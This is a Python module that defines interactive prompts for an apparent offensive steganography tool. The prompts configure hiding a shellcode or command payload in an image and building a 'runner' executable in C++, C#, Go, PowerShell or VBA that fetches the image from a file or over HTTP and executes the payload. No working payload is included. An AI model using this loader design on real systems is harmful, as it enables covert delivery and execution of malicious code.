import os
from datetime import datetime
from enum import Enum
from inspect import Parameter, signature
from typing import List

from src.builder import Builder


timestamp = datetime.now().strftime('%d_%H_%M_%S')

algorithm_selection = {
    'type': 'list',
    'name': 'algorithm',
    'message': 'Desired stego algorithm:',
    'choices': [
        'LSB',
        'LSBX',
        'LSBM',
        'ColorCode'
    ],
    'default': 'LSB'
}


def algorithm_param_questions(algo: type):
    params = signature(algo.__init__).parameters.values()
    params = [p for p in params if p.name not in ['self', 'args', 'kwargs']]

    questions = []

    for p in params:
        param_class = p.annotation

        choices = None
        q_type = None
        custom_filter = None
        if issubclass(param_class, Enum):
            choices = list(param_class.__members__.keys())
            q_type = 'list'
            custom_filter = lambda s: f'{param_class[s].value}'

        questions.append({
            'type': q_type or 'input',
            'name': p.name,
            'message': f'[{algo.__name__}] {p.name}:',
            'choices': choices,
            'default': choices[0],
            'filter': custom_filter
        })

    return questions


# TODO: do we really need these questions?
image_questions = [
    algorithm_selection,
    {
        'type': 'input',
        'name': 'payload_file',
        'message': 'Payload file:',
        'validate': lambda file_path: os.path.isfile(file_path) or 'File does not exist!',
        'default': 'samples/payloads/shellcode/test.txt'
    },
    {
        'type': 'confirm',
        'name': 'use_existing_image',
        'message': 'Use an existing image for embedding?',
        'default': False
    },
    {
        'type': 'input',
        'name': 'input_image',
        'message': 'Stego source image:',
        'validate': lambda file_path: os.path.isfile(file_path) or 'File does not exist!',
        'when': lambda answers: answers['use_existing_image'],
        'default': 'samples/images/cat.png'
    },
    {
        'type': 'input',
        'name': 'output_image',
        'message': 'Output stego image:',
        'default': f'image_{timestamp}.png'
    },
    {
        'type': 'confirm',
        'name': 'generate_runner',
        'message': 'Generate a new runner executable?',
        'default': False
    }
]

runner_questions = [
    {
        'type': 'list',
        'name': 'language',
        'message': 'Desired runner language:',
        'choices': [
            'C++',
            'C#',
            'Go',
            'PowerShell',
            'VBA'
        ],
        'default': 'C++'
    },
    {
        'type': 'list',
        'name': 'arch',
        'message': 'Desired runner arch:',
        'choices': [
            'x86',
            'x64'
        ],
        'default': 'x86',
        'when': lambda answers: answers['language'] != 'PowerShell'
    },
    {
        'type': 'list',
        'name': 'payload',
        'message': 'Desired payload type:',
        'choices': [
            'Cmd',
            'Shellcode'
        ],
        'default': 'Cmd'
    },
    {
        'type': 'list',
        'name': 'image_source',
        'message': 'Desired image source:',
        'choices': [
            'ImageFile',
            'HTTPX'
        ],
        'default': 'ImageFile'
    },
    {
        'type': 'input',
        'name': 'ARTIFACT_PATH',
        'message': 'Output runner file:',
        'default': lambda answers: f'./runner_{timestamp}.{Builder.get_implementation(answers["language"]).build_extension}'
    },
    {
        'type': 'confirm',
        'name': 'save_config',
        'message': 'Save config to file?',
        'default': False
    }
]
